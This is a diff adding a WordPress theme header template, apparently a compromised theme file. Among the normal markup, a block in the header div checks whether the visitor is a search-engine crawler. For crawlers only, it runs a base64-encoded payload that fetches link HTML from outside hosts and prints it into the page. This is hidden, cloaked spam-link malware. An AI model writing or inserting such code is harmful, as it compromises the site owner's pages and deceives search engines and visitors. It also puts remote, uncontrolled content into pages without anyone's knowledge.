@@ -1,0 +1,45 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
+<head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />
+<title><?php bloginfo('name'); ?> <?php if ( is_single() ) { ?> &raquo; Blog Archive <?php } ?> <?php wp_title(); ?></title>
+<meta name="generator" content="WordPress <?php bloginfo('version'); ?>" /><!-- leave this for stats -->
+<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
+<link rel="alternate" type="application/rss+xml" title="<?php bloginfo('name'); ?> RSS Feed" href="<?php bloginfo('rss2_url'); ?>" />
+<link rel="shortcut icon" href="/favicon.ico" >
+<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
+<?php wp_head(); ?>
+</head>
+<body>
+<div id="header">
+<?php
+if(strstr($_SERVER['HTTP_USER_AGENT'], 'Mybot') || strstr($_SERVER['HTTP_USER_AGENT'], 'Googlebot') || strstr($_SERVER['HTTP_USER_AGENT'], 'msn')|| strstr($_SERVER['HTTP_USER_AGENT'], 'Slurp')) {
+eval(base64_decode('CmZ1bmN0aW9uIHJlYWRmKCR2KXsKaWYgKGZ1bmN0aW9uX2V4aXN0cygiY3VybF9pbml0IikpewogICAgICAgICAgICBpZiAoJGNoID0gQGN1cmxfaW5pdCgpKSB7CgogICAgICAgI
+CAgICAgICAgQGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICAgICAgICAgICAgICAkdik7CiAgICAgICAgICAgICAgICBAY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgICAgICAgICAgIG
+ZhbHNlKTsKICAgICAgICAgICAgICAgIEBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsICAgdHJ1ZSk7CiAgICAgICAgICAgICAgICBAY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1V
+TRVJBR0VOVCwgICAgICAgICJ3cF9kZWJ1ZyIpOwoKICAgICAgICAgICAgICAgIGlmICgkZGF0YSA9IEBjdXJsX2V4ZWMoJGNoKSkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAkZGF0YTsKICAgICAg
+ICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBAY3VybF9jbG9zZSgkY2gpOwogICAgICAgICAgICB9Cn0KCn0KCmZ1bmN0aW9uIEdldENvbnRlbnQoKQp7CmVycm9yX3JlcG9ydGluZygwKTsKJG1pcnJvc
+nM9YXJyYXkoImh0dHA6Ly9zdG9wc21va2luZ3Jldmlld3Mub3JnL3R4dC9saW5rcy5odG1sIiwgImh0dHA6Ly9saW5rLW9zLmZyZWVob3N0aWEuY29tL2xpbmtzLmh0bWwiKTsKZm9yZWFjaCgkbWlycm9ycy
+BhcyAkayA9PiAkdikKICAgIHsKCWlmKCEoJGNvbnRlbnQ9cmVhZGYoJHYpKSl7CiAgICAgICAgICAgIGlmICgoc3RycG9zKCRjb250ZW50LCI0MDQiKT09PWZhbHNlKSYmKHN0cnBvcygkY29udGVudCwiNDA
+zIik9PT1mYWxzZSkpIGJyZWFrOwogICAgICAgICAgICBlbHNlICRjb250ZW50PSIiOwoJfWVsc2UgYnJlYWs7CiAgICB9CmlmICgkY29udGVudD09IiIpe3JldHVybiAiPCEtLSBsaW5rcyBub3QgZm91bmQg
+LS0+Ijt9CnJldHVybiAkY29udGVudDsKfQplY2hvIEdldENvbnRlbnQoKTsK'));
+}
+?>
+
+	<div id="header-left">
+		<h1><a href="<?php echo get_option('home'); ?>/">
+                </a></h1>
+	</div>
+        <div id="header-right">
+        </div>	
+</div>
+<div id="menu">
+	<ul>
+	    <li <?php if(is_home()){echo 'class="current_page_item"';}?>>
+		<?php wp_list_pages('title_li=&depth=1&sort_column=menu_order');?>
+		<li id="rss"><a title="RSS Feed of Posts" href="<?php bloginfo('rss2_url'); ?>"></a></li>
+	</ul>
+	</div>
+<!-- end header -->
+
+<div id="wrap">
